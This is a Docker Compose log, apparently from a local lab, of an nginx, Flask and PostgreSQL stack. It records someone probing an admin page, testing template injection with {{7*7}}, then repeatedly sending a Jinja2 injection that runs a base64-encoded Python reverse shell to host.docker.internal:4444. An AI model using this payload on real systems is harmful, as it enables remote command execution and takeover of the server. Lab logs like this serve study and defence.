nginx-1  | 2026-05-12T13:53:19.209300201Z /docker-entrypoint.sh: /docker-entrypoint.d/ is not empty, will attempt to perform configuration
nginx-1  | 2026-05-12T14:02:25.657644045Z 172.19.0.1 - - [12/May/2026:14:02:25 +0000] "GET /admin/diagnostico?host=%7B%7B+config.__class__.__init__.__globals__%5B%27os%27%5D.popen%28%27echo+aW1wb3J0IHNvY2tldCxzdWJwcm9jZXNzLG9zO3M9c29ja2V0LnNvY2tldCgpO3MuY29ubmVjdCgoImhvc3QuZG9ja2VyLmludGVybmFsIiw0NDQ0KSk7b3MuZHVwMihzLmZpbGVubygpLDApO29zLmR1cDIocy5maWxlbm8oKSwxKTtvcy5kdXAyKHMuZmlsZW5vKCksMik7c3VicHJvY2Vzcy5jYWxsKFsiL2Jpbi9iYXNoIiwiLWkiXSk%3D+%7C+base64+-d+%7C+python3%27%29.read%28%29+%7D%7D HTTP/1.1" 504 569 "http://localhost:8080/admin/diagnostico?host=%7B%7B+config.__class__.__init__.__globals__%5B%27os%27%5D.popen%28%27echo+aW1wb3J0IHNvY2tldCxzdWJwcm9jZXNzLG9zO3M9c29ja2V0LnNvY2tldCgpO3MuY29ubmVjdCgoImhvc3QuZG9ja2VyLmludGVybmFsIiw0NDQ0KSk7b3MuZHVwMihzLmZpbGVubygpLDApO29zLmR1cDIocy5maWxlbm8oKSwxKTtvcy5kdXAyKHMuZmlsZW5vKCksMik7c3VicHJvY2Vzcy5jYWxsKFsiL2Jpbi9iYXNoIiwiLWkiXSk%3D+%7C+base64+-d+%7C+python3%27%29.read%28%29+%7D%7D" "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/147.0.0.0 Safari/537.36"
db-1     | 2026-05-12T13:53:13.766457240Z     pg_ctl -D /var/lib/postgresql/data -l logfile start
db-1     | 2026-05-12T13:53:13.766457990Z 
db-1     | 2026-05-12T13:53:13.766499074Z initdb: warning: enabling "trust" authentication for local connections
db-1     | 2026-05-12T13:53:13.766501574Z initdb: hint: You can change this by editing pg_hba.conf or using the option -A, or --auth-local and --auth-host, the next time you run initdb.
nginx-1  | 2026-05-12T14:02:25.760258712Z 172.19.0.1 - - [12/May/2026:14:02:25 +0000] "GET /.well-known/appspecific/com.chrome.devtools.json HTTP/1.1" 404 207 "-" "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/147.0.0.0 Safari/537.36"
nginx-1  | 2026-05-12T14:33:34.848067603Z 2026/05/12 14:33:34 [error] 29#29: *49 upstream timed out (110: Operation timed out) while reading response header from upstream, client: 172.19.0.1, server: , request: "GET /admin/diagnostico?host=%7B%7B+config.__class__.__init__.__globals__%5B%27os%27%5D.popen%28%27echo+aW1wb3J0IHNvY2tldCxzdWJwcm9jZXNzLG9zO3M9c29ja2V0LnNvY2tldCgpO3MuY29ubmVjdCgoImhvc3QuZG9ja2VyLmludGVybmFsIiw0NDQ0KSk7b3MuZHVwMihzLmZpbGVubygpLDApO29zLmR1cDIocy5maWxlbm8oKSwxKTtvcy5kdXAyKHMuZmlsZW5vKCksMik7c3VicHJvY2Vzcy5jYWxsKFsiL2Jpbi9iYXNoIiwiLWkiXSk%3D+%7C+base64+-d+%7C+python3%27%29.read%28%29+%7D%7D HTTP/1.1", upstream: "http://172.19.0.2:5000/admin/diagnostico?host=%7B%7B+config.__class__.__init__.__globals__%5B%27os%27%5D.popen%28%27echo+aW1wb3J0IHNvY2tldCxzdWJwcm9jZXNzLG9zO3M9c29ja2V0LnNvY2tldCgpO3MuY29ubmVjdCgoImhvc3QuZG9ja2VyLmludGVybmFsIiw0NDQ0KSk7b3MuZHVwMihzLmZpbGVubygpLDApO29zLmR1cDIocy5maWxlbm8oKSwxKTtvcy5kdXAyKHMuZmlsZW5vKCksMik7c3VicHJvY2Vzcy5jYWxsKFsiL2Jpbi9iYXNoIiwiLWkiXSk%3D+%7C+base64+-d+%7C+python3%27%29.read%28%29+%7D%7D", host: "localhost:8080", referrer: "http://localhost:8080/admin/diagnostico?host=%7B%7B+config.__class__.__init__.__globals__%5B%27os%27%5D.popen%28%27echo+aW1wb3J0IHNvY2tldCxzdWJwcm9jZXNzLG9zO3M9c29ja2V0LnNvY2tldCgpO3MuY29ubmVjdCgoImhvc3QuZG9ja2VyLmludGVybmFsIiw0NDQ0KSk7b3MuZHVwMihzLmZpbGVubygpLDApO29zLmR1cDIocy5maWxlbm8oKSwxKTtvcy5kdXAyKHMuZmlsZW5vKCksMik7c3VicHJvY2Vzcy5jYWxsKFsiL2Jpbi9iYXNoIiwiLWkiXSk%3D+%7C+base64+-d+%7C+python3%27%29.read%28%29+%7D%7D"
nginx-1  | 2026-05-12T14:33:34.848398353Z 172.19.0.1 - - [12/May/2026:14:33:34 +0000] "GET /admin/diagnostico?host=%7B%7B+config.__class__.__init__.__globals__%5B%27os%27%5D.popen%28%27echo+aW1wb3J0IHNvY2tldCxzdWJwcm9jZXNzLG9zO3M9c29ja2V0LnNvY2tldCgpO3MuY29ubmVjdCgoImhvc3QuZG9ja2VyLmludGVybmFsIiw0NDQ0KSk7b3MuZHVwMihzLmZpbGVubygpLDApO29zLmR1cDIocy5maWxlbm8oKSwxKTtvcy5kdXAyKHMuZmlsZW5vKCksMik7c3VicHJvY2Vzcy5jYWxsKFsiL2Jpbi9iYXNoIiwiLWkiXSk%3D+%7C+base64+-d+%7C+python3%27%29.read%28%29+%7D%7D HTTP/1.1" 504 569 "http://localhost:8080/admin/diagnostico?host=%7B%7B+config.__class__.__init__.__globals__%5B%27os%27%5D.popen%28%27echo+aW1wb3J0IHNvY2tldCxzdWJwcm9jZXNzLG9zO3M9c29ja2V0LnNvY2tldCgpO3MuY29ubmVjdCgoImhvc3QuZG9ja2VyLmludGVybmFsIiw0NDQ0KSk7b3MuZHVwMihzLmZpbGVubygpLDApO29zLmR1cDIocy5maWxlbm8oKSwxKTtvcy5kdXAyKHMuZmlsZW5vKCksMik7c3VicHJvY2Vzcy5jYWxsKFsiL2Jpbi9iYXNoIiwiLWkiXSk%3D+%7C+base64+-d+%7C+python3%27%29.read%28%29+%7D%7D" "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/147.0.0.0 Safari/537.36"
nginx-1  | 2026-05-12T14:33:34.887907228Z 172.19.0.1 - - [12/May/2026:14:33:34 +0000] "GET /.well-known/appspecific/com.chrome.devtools.json HTTP/1.1" 404 207 "-" "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/147.0.0.0 Safari/537.36"
nginx-1  | 2026-05-12T14:34:35.699279799Z 172.19.0.1 - - [12/May/2026:14:34:35 +0000] "GET /admin/diagnostico HTTP/1.1" 200 3556 "-" "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/147.0.0.0 Safari/537.36"
db-1     | 2026-05-12T13:53:13.783452199Z waiting for server to start....2026-05-12 13:53:13.783 UTC [40] LOG:  starting PostgreSQL 15.17 on aarch64-unknown-linux-musl, compiled by gcc (Alpine 15.2.0) 15.2.0, 64-bit
db-1     | 2026-05-12T13:53:13.784031449Z 2026-05-12 13:53:13.783 UTC [40] LOG:  listening on Unix socket "/var/run/postgresql/.s.PGSQL.5432"
db-1     | 2026-05-12T13:53:13.785916407Z 2026-05-12 13:53:13.785 UTC [43] LOG:  database system was shut down at 2026-05-12 13:53:13 UTC
nginx-1  | 2026-05-12T14:34:35.719820924Z 172.19.0.1 - - [12/May/2026:14:34:35 +0000] "GET /.well-known/appspecific/com.chrome.devtools.json HTTP/1.1" 404 207 "-" "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/147.0.0.0 Safari/537.36"
nginx-1  | 2026-05-12T14:35:43.687290831Z 2026/05/12 14:35:43 [error] 29#29: *49 upstream timed out (110: Operation timed out) while reading response header from upstream, client: 172.19.0.1, server: , request: "GET /admin/diagnostico?host=%7B%7B+config.__class__.__init__.__globals__%5B%27os%27%5D.popen%28%27echo+aW1wb3J0IHNvY2tldCxzdWJwcm9jZXNzLG9zO3M9c29ja2V0LnNvY2tldCgpO3MuY29ubmVjdCgoImhvc3QuZG9ja2VyLmludGVybmFsIiw0NDQ0KSk7b3MuZHVwMihzLmZpbGVubygpLDApO29zLmR1cDIocy5maWxlbm8oKSwxKTtvcy5kdXAyKHMuZmlsZW5vKCksMik7c3VicHJvY2Vzcy5jYWxsKFsiL2Jpbi9iYXNoIiwiLWkiXSk%3D+%7C+base64+-d+%7C+python3%27%29.read%28%29+%7D%7D HTTP/1.1", upstream: "http://172.19.0.2:5000/admin/diagnostico?host=%7B%7B+config.__class__.__init__.__globals__%5B%27os%27%5D.popen%28%27echo+aW1wb3J0IHNvY2tldCxzdWJwcm9jZXNzLG9zO3M9c29ja2V0LnNvY2tldCgpO3MuY29ubmVjdCgoImhvc3QuZG9ja2VyLmludGVybmFsIiw0NDQ0KSk7b3MuZHVwMihzLmZpbGVubygpLDApO29zLmR1cDIocy5maWxlbm8oKSwxKTtvcy5kdXAyKHMuZmlsZW5vKCksMik7c3VicHJvY2Vzcy5jYWxsKFsiL2Jpbi9iYXNoIiwiLWkiXSk%3D+%7C+base64+-d+%7C+python3%27%29.read%28%29+%7D%7D", host: "localhost:8080", referrer: "http://localhost:8080/admin/diagnostico"
nginx-1  | 2026-05-12T14:35:43.687759373Z 172.19.0.1 - - [12/May/2026:14:35:43 +0000] "GET /admin/diagnostico?host=%7B%7B+config.__class__.__init__.__globals__%5B%27os%27%5D.popen%28%27echo+aW1wb3J0IHNvY2tldCxzdWJwcm9jZXNzLG9zO3M9c29ja2V0LnNvY2tldCgpO3MuY29ubmVjdCgoImhvc3QuZG9ja2VyLmludGVybmFsIiw0NDQ0KSk7b3MuZHVwMihzLmZpbGVubygpLDApO29zLmR1cDIocy5maWxlbm8oKSwxKTtvcy5kdXAyKHMuZmlsZW5vKCksMik7c3VicHJvY2Vzcy5jYWxsKFsiL2Jpbi9iYXNoIiwiLWkiXSk%3D+%7C+base64+-d+%7C+python3%27%29.read%28%29+%7D%7D HTTP/1.1" 504 569 "http://localhost:8080/admin/diagnostico" "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/147.0.0.0 Safari/537.36"
db-1     | 2026-05-12T13:53:13.787419490Z 2026-05-12 13:53:13.787 UTC [40] LOG:  database system is ready to accept connections
db-1     | 2026-05-12T13:53:13.876712490Z  done
db-1     | 2026-05-12T13:53:13.876726532Z server started
db-1     | 2026-05-12T13:53:13.901998282Z CREATE DATABASE
db-1     | 2026-05-12T13:53:13.903117032Z 
db-1     | 2026-05-12T13:53:13.903166490Z 
db-1     | 2026-05-12T13:53:13.903180657Z /usr/local/bin/docker-entrypoint.sh: running /docker-entrypoint-initdb.d/init.sql
nginx-1  | 2026-05-12T14:35:43.751491498Z 172.19.0.1 - - [12/May/2026:14:35:43 +0000] "GET /.well-known/appspecific/com.chrome.devtools.json HTTP/1.1" 404 207 "-" "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/147.0.0.0 Safari/537.36"
nginx-1   | 2026-05-12T14:38:28.559592535Z 172.19.0.1 - - [12/May/2026:14:38:28 +0000] "GET /admin/diagnostico?host=%7B%7B+config.__class__.__init__.__globals__%5B%27os%27%5D.popen%28%27echo+aW1wb3J0IHNvY2tldCxzdWJwcm9jZXNzLG9zO3M9c29ja2V0LnNvY2tldCgpO3MuY29ubmVjdCgoImhvc3QuZG9ja2VyLmludGVybmFsIiw0NDQ0KSk7b3MuZHVwMihzLmZpbGVubygpLDApO29zLmR1cDIocy5maWxlbm8oKSwxKTtvcy5kdXAyKHMuZmlsZW5vKCksMik7c3VicHJvY2Vzcy5jYWxsKFsiL2Jpbi9iYXNoIiwiLWkiXSk%3D+%7C+base64+-d+%7C+python3%27%29.read%28%29+%7D%7D HTTP/1.1" 504 569 "http://localhost:8080/admin/diagnostico" "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/147.0.0.0 Safari/537.36"
nginx-1   | 2026-05-12T14:38:28.560283993Z 2026/05/12 14:38:28 [error] 29#29: *58 upstream timed out (110: Operation timed out) while reading response header from upstream, client: 172.19.0.1, server: , request: "GET /admin/diagnostico?host=%7B%7B+config.__class__.__init__.__globals__%5B%27os%27%5D.popen%28%27echo+aW1wb3J0IHNvY2tldCxzdWJwcm9jZXNzLG9zO3M9c29ja2V0LnNvY2tldCgpO3MuY29ubmVjdCgoImhvc3QuZG9ja2VyLmludGVybmFsIiw0NDQ0KSk7b3MuZHVwMihzLmZpbGVubygpLDApO29zLmR1cDIocy5maWxlbm8oKSwxKTtvcy5kdXAyKHMuZmlsZW5vKCksMik7c3VicHJvY2Vzcy5jYWxsKFsiL2Jpbi9iYXNoIiwiLWkiXSk%3D+%7C+base64+-d+%7C+python3%27%29.read%28%29+%7D%7D HTTP/1.1", upstream: "http://172.19.0.2:5000/admin/diagnostico?host=%7B%7B+config.__class__.__init__.__globals__%5B%27os%27%5D.popen%28%27echo+aW1wb3J0IHNvY2tldCxzdWJwcm9jZXNzLG9zO3M9c29ja2V0LnNvY2tldCgpO3MuY29ubmVjdCgoImhvc3QuZG9ja2VyLmludGVybmFsIiw0NDQ0KSk7b3MuZHVwMihzLmZpbGVubygpLDApO29zLmR1cDIocy5maWxlbm8oKSwxKTtvcy5kdXAyKHMuZmlsZW5vKCksMik7c3VicHJvY2Vzcy5jYWxsKFsiL2Jpbi9iYXNoIiwiLWkiXSk%3D+%7C+base64+-d+%7C+python3%27%29.read%28%29+%7D%7D", host: "localhost:8080", referrer: "http://localhost:8080/admin/diagnostico"
webapp-1  | 2026-05-12T13:53:19.220306493Z  * Serving Flask app 'app'
webapp-1  | 2026-05-12T13:53:19.220315410Z  * Debug mode: off
webapp-1  | 2026-05-12T13:53:19.221473118Z [31m[1mWARNING: This is a development server. Do not use it in a production deployment. Use a production WSGI server instead.[0m
webapp-1  | 2026-05-12T13:53:19.221477660Z  * Running on all addresses (0.0.0.0)
nginx-1   | 2026-05-12T14:38:28.626521452Z 172.19.0.1 - - [12/May/2026:14:38:28 +0000] "GET /.well-known/appspecific/com.chrome.devtools.json HTTP/1.1" 404 207 "-" "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/147.0.0.0 Safari/537.36"
nginx-1   | 2026-05-12T14:38:46.474102210Z 172.19.0.1 - - [12/May/2026:14:38:46 +0000] "GET /admin/diagnostico?host=%7B%7B+config.__class__.__init__.__globals__%5B%27os%27%5D.popen%28%27echo+aW1wb3J0IHNvY2tldCxzdWJwcm9jZXNzLG9zO3M9c29ja2V0LnNvY2tldCgpO3MuY29ubmVjdCgoImhvc3QuZG9ja2VyLmludGVybmFsIiw0NDQ0KSk7b3MuZHVwMihzLmZpbGVubygpLDApO29zLmR1cDIocy5maWxlbm8oKSwxKTtvcy5kdXAyKHMuZmlsZW5vKCksMik7c3VicHJvY2Vzcy5jYWxsKFsiL2Jpbi9iYXNoIiwiLWkiXSk%3D+%7C+base64+-d+%7C+python3%27%29.read%28%29+%7D%7D HTTP/1.1" 200 4826 "http://localhost:8080/admin/diagnostico" "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/147.0.0.0 Safari/537.36"
nginx-1   | 2026-05-12T14:38:46.494100585Z 172.19.0.1 - - [12/May/2026:14:38:46 +0000] "GET /.well-known/appspecific/com.chrome.devtools.json HTTP/1.1" 404 207 "-" "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/147.0.0.0 Safari/537.36"
db-1      | 2026-05-12T13:53:13.913312990Z CREATE TABLE
db-1      | 2026-05-12T13:53:13.913756907Z INSERT 0 3
db-1      | 2026-05-12T13:53:13.914695574Z 
db-1      | 2026-05-12T13:53:13.914697907Z 
db-1      | 2026-05-12T13:53:13.915095032Z waiting for server to shut down....2026-05-12 13:53:13.915 UTC [40] LOG:  received fast shutdown request
db-1      | 2026-05-12T13:53:13.916247532Z 2026-05-12 13:53:13.915 UTC [40] LOG:  aborting any active transactions
db-1      | 2026-05-12T13:53:13.916269699Z 2026-05-12 13:53:13.916 UTC [40] LOG:  background worker "logical replication launcher" (PID 46) exited with exit code 1
db-1      | 2026-05-12T13:53:13.917543407Z 2026-05-12 13:53:13.917 UTC [41] LOG:  shutting down
nginx-1   | 2026-05-12T14:39:48.585181573Z 172.19.0.1 - - [12/May/2026:14:39:48 +0000] "GET /admin/diagnostico?host=%7B%7B+config.__class__.__init__.__globals__%5B%27os%27%5D.popen%28%27echo+aW1wb3J0IHNvY2tldCxzdWJwcm9jZXNzLG9zO3M9c29ja2V0LnNvY2tldCgpO3MuY29ubmVjdCgoImhvc3QuZG9ja2VyLmludGVybmFsIiw0NDQ0KSk7b3MuZHVwMihzLmZpbGVubygpLDApO29zLmR1cDIocy5maWxlbm8oKSwxKTtvcy5kdXAyKHMuZmlsZW5vKCksMik7c3VicHJvY2Vzcy5jYWxsKFsiL2Jpbi9iYXNoIiwiLWkiXSk%3D+%7C+base64+-d+%7C+python3%27%29.read%28%29+%7D%7D HTTP/1.1" 499 0 "http://localhost:8080/admin/diagnostico?host=%7B%7B+config.__class__.__init__.__globals__%5B%27os%27%5D.popen%28%27echo+aW1wb3J0IHNvY2tldCxzdWJwcm9jZXNzLG9zO3M9c29ja2V0LnNvY2tldCgpO3MuY29ubmVjdCgoImhvc3QuZG9ja2VyLmludGVybmFsIiw0NDQ0KSk7b3MuZHVwMihzLmZpbGVubygpLDApO29zLmR1cDIocy5maWxlbm8oKSwxKTtvcy5kdXAyKHMuZmlsZW5vKCksMik7c3VicHJvY2Vzcy5jYWxsKFsiL2Jpbi9iYXNoIiwiLWkiXSk%3D+%7C+base64+-d+%7C+python3%27%29.read%28%29+%7D%7D" "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/147.0.0.0 Safari/537.36"
nginx-1   | 2026-05-12T14:39:48.655446406Z 172.19.0.1 - - [12/May/2026:14:39:48 +0000] "GET /admin/diagnostico?host=%7B%7B+config.__class__.__init__.__globals__%5B%27os%27%5D.popen%28%27echo+aW1wb3J0IHNvY2tldCxzdWJwcm9jZXNzLG9zO3M9c29ja2V0LnNvY2tldCgpO3MuY29ubmVjdCgoImhvc3QuZG9ja2VyLmludGVybmFsIiw0NDQ0KSk7b3MuZHVwMihzLmZpbGVubygpLDApO29zLmR1cDIocy5maWxlbm8oKSwxKTtvcy5kdXAyKHMuZmlsZW5vKCksMik7c3VicHJvY2Vzcy5jYWxsKFsiL2Jpbi9iYXNoIiwiLWkiXSk%3D+%7C+base64+-d+%7C+python3%27%29.read%28%29+%7D%7D HTTP/1.1" 200 4826 "http://localhost:8080/admin/diagnostico?host=%7B%7B+config.__class__.__init__.__globals__%5B%27os%27%5D.popen%28%27echo+aW1wb3J0IHNvY2tldCxzdWJwcm9jZXNzLG9zO3M9c29ja2V0LnNvY2tldCgpO3MuY29ubmVjdCgoImhvc3QuZG9ja2VyLmludGVybmFsIiw0NDQ0KSk7b3MuZHVwMihzLmZpbGVubygpLDApO29zLmR1cDIocy5maWxlbm8oKSwxKTtvcy5kdXAyKHMuZmlsZW5vKCksMik7c3VicHJvY2Vzcy5jYWxsKFsiL2Jpbi9iYXNoIiwiLWkiXSk%3D+%7C+base64+-d+%7C+python3%27%29.read%28%29+%7D%7D" "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/147.0.0.0 Safari/537.36"
nginx-1   | 2026-05-12T14:39:48.671179656Z 172.19.0.1 - - [12/May/2026:14:39:48 +0000] "GET /.well-known/appspecific/com.chrome.devtools.json HTTP/1.1" 404 207 "-" "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/147.0.0.0 Safari/537.36"
webapp-1  | 2026-05-12T13:53:19.221478868Z  * Running on http://127.0.0.1:5000
webapp-1  | 2026-05-12T13:53:19.221479701Z  * Running on http://172.19.0.2:5000
webapp-1  | 2026-05-12T13:53:19.221480535Z [33mPress CTRL+C to quit[0m
webapp-1  | 2026-05-12T13:53:50.507507550Z 172.19.0.3 - - [12/May/2026 13:53:50] "GET / HTTP/1.1" 200 -
webapp-1  | 2026-05-12T13:53:50.522274550Z 172.19.0.3 - - [12/May/2026 13:53:50] "[33mGET /.well-known/appspecific/com.chrome.devtools.json HTTP/1.1[0m" 404 -
webapp-1  | 2026-05-12T13:53:57.000882136Z 172.19.0.3 - - [12/May/2026 13:53:57] "[36mGET /robots.txt HTTP/1.1[0m" 304 -
webapp-1  | 2026-05-12T13:53:57.012978094Z 172.19.0.3 - - [12/May/2026 13:53:57] "[33mGET /.well-known/appspecific/com.chrome.devtools.json HTTP/1.1[0m" 404 -
webapp-1  | 2026-05-12T13:54:38.186661864Z 172.19.0.3 - - [12/May/2026 13:54:38] "[33mGET /.well-known/appspecific/com.chrome.devtools.json HTTP/1.1[0m" 404 -
webapp-1  | 2026-05-12T13:54:47.846358827Z 172.19.0.3 - - [12/May/2026 13:54:47] "GET / HTTP/1.1" 200 -
webapp-1  | 2026-05-12T13:54:47.859552577Z 172.19.0.3 - - [12/May/2026 13:54:47] "[33mGET /.well-known/appspecific/com.chrome.devtools.json HTTP/1.1[0m" 404 -
webapp-1  | 2026-05-12T13:55:00.802022041Z 172.19.0.3 - - [12/May/2026 13:55:00] "[36mGET /robots.txt HTTP/1.1[0m" 304 -
webapp-1  | 2026-05-12T13:55:00.823070125Z 172.19.0.3 - - [12/May/2026 13:55:00] "[33mGET /.well-known/appspecific/com.chrome.devtools.json HTTP/1.1[0m" 404 -
webapp-1  | 2026-05-12T13:55:10.213064963Z 172.19.0.3 - - [12/May/2026 13:55:10] "[32mGET /admin HTTP/1.1[0m" 302 -
webapp-1  | 2026-05-12T13:55:10.224245796Z 172.19.0.3 - - [12/May/2026 13:55:10] "GET /admin/login HTTP/1.1" 200 -
webapp-1  | 2026-05-12T13:55:10.241145713Z 172.19.0.3 - - [12/May/2026 13:55:10] "[33mGET /.well-known/appspecific/com.chrome.devtools.json HTTP/1.1[0m" 404 -
webapp-1  | 2026-05-12T13:55:22.856182385Z 172.19.0.3 - - [12/May/2026 13:55:22] "GET /backup.txt HTTP/1.1" 200 -
webapp-1  | 2026-05-12T13:55:22.871898052Z 172.19.0.3 - - [12/May/2026 13:55:22] "[33mGET /.well-known/appspecific/com.chrome.devtools.json HTTP/1.1[0m" 404 -
webapp-1  | 2026-05-12T13:55:32.500076223Z 172.19.0.3 - - [12/May/2026 13:55:32] "[33mGET /.well-known/appspecific/com.chrome.devtools.json HTTP/1.1[0m" 404 -
webapp-1  | 2026-05-12T13:55:32.515104223Z 172.19.0.3 - - [12/May/2026 13:55:32] "[33mGET /.well-known/appspecific/com.chrome.devtools.json HTTP/1.1[0m" 404 -
db-1      | 2026-05-12T13:53:13.917942824Z 2026-05-12 13:53:13.917 UTC [41] LOG:  checkpoint starting: shutdown immediate
db-1      | 2026-05-12T13:53:13.940475032Z 2026-05-12 13:53:13.940 UTC [41] LOG:  checkpoint complete: wrote 930 buffers (5.7%); 0 WAL file(s) added, 0 removed, 0 recycled; write=0.012 s, sync=0.010 s, total=0.023 s; sync files=304, longest=0.003 s, average=0.001 s; distance=4254 kB, estimate=4254 kB
webapp-1  | 2026-05-12T13:55:33.602972807Z 172.19.0.3 - - [12/May/2026 13:55:33] "[32mPOST /admin/login HTTP/1.1[0m" 302 -
webapp-1  | 2026-05-12T13:55:33.607967390Z 172.19.0.3 - - [12/May/2026 13:55:33] "GET /admin/dashboard HTTP/1.1" 200 -
webapp-1  | 2026-05-12T13:55:33.623664057Z 172.19.0.3 - - [12/May/2026 13:55:33] "[33mGET /.well-known/appspecific/com.chrome.devtools.json HTTP/1.1[0m" 404 -
db-1      | 2026-05-12T13:53:13.943557199Z 2026-05-12 13:53:13.942 UTC [40] LOG:  database system is shut down
db-1      | 2026-05-12T13:53:14.015232574Z  done
db-1      | 2026-05-12T13:53:14.015247365Z server stopped
db-1      | 2026-05-12T13:53:14.015773282Z 
db-1      | 2026-05-12T13:53:14.015775782Z PostgreSQL init process complete; ready for start up.
db-1      | 2026-05-12T13:53:14.015776532Z 
webapp-1  | 2026-05-12T13:55:41.330109144Z 172.19.0.3 - - [12/May/2026 13:55:41] "GET /admin/diagnostico HTTP/1.1" 200 -
webapp-1  | 2026-05-12T13:55:41.349148269Z 172.19.0.3 - - [12/May/2026 13:55:41] "[33mGET /.well-known/appspecific/com.chrome.devtools.json HTTP/1.1[0m" 404 -
webapp-1  | 2026-05-12T13:55:47.621796814Z 172.19.0.3 - - [12/May/2026 13:55:47] "GET /admin/diagnostico?host={{7*7}} HTTP/1.1" 200 -
webapp-1  | 2026-05-12T13:55:47.638165605Z 172.19.0.3 - - [12/May/2026 13:55:47] "[33mGET /.well-known/appspecific/com.chrome.devtools.json HTTP/1.1[0m" 404 -
webapp-1  | 2026-05-12T13:56:30.446030209Z Traceback (most recent call last):
webapp-1  | 2026-05-12T13:56:30.446053792Z   File "<stdin>", line 1, in <module>
webapp-1  | 2026-05-12T13:56:30.446347084Z ConnectionRefusedError: [Errno 111] Connection refused
webapp-1  | 2026-05-12T13:56:30.463505542Z Traceback (most recent call last):
webapp-1  | 2026-05-12T13:56:30.463525251Z   File "<stdin>", line 1, in <module>
webapp-1  | 2026-05-12T13:56:30.463527084Z ConnectionRefusedError: [Errno 111] Connection refused
webapp-1  | 2026-05-12T13:56:30.479011251Z Traceback (most recent call last):
webapp-1  | 2026-05-12T13:56:30.479027917Z   File "<stdin>", line 1, in <module>
webapp-1  | 2026-05-12T13:56:30.479029834Z ConnectionRefusedError: [Errno 111] Connection refused
db-1      | 2026-05-12T13:53:14.025597865Z 2026-05-12 13:53:14.025 UTC [1] LOG:  starting PostgreSQL 15.17 on aarch64-unknown-linux-musl, compiled by gcc (Alpine 15.2.0) 15.2.0, 64-bit
db-1      | 2026-05-12T13:53:14.025608490Z 2026-05-12 13:53:14.025 UTC [1] LOG:  listening on IPv4 address "0.0.0.0", port 5432
db-1      | 2026-05-12T13:53:14.025612365Z 2026-05-12 13:53:14.025 UTC [1] LOG:  listening on IPv6 address "::", port 5432
db-1      | 2026-05-12T13:53:14.026949449Z 2026-05-12 13:53:14.026 UTC [1] LOG:  listening on Unix socket "/var/run/postgresql/.s.PGSQL.5432"
db-1      | 2026-05-12T13:53:14.029448240Z 2026-05-12 13:53:14.029 UTC [58] LOG:  database system was shut down at 2026-05-12 13:53:13 UTC
db-1      | 2026-05-12T13:53:14.030891199Z 2026-05-12 13:53:14.030 UTC [1] LOG:  database system is ready to accept connections
db-1      | 2026-05-12T13:58:14.128980175Z 2026-05-12 13:58:14.128 UTC [56] LOG:  checkpoint starting: time
db-1      | 2026-05-12T13:58:18.262734386Z 2026-05-12 13:58:18.262 UTC [56] LOG:  checkpoint complete: wrote 44 buffers (0.3%); 0 WAL file(s) added, 0 removed, 0 recycled; write=4.123 s, sync=0.006 s, total=4.134 s; sync files=12, longest=0.004 s, average=0.001 s; distance=252 kB, estimate=252 kB
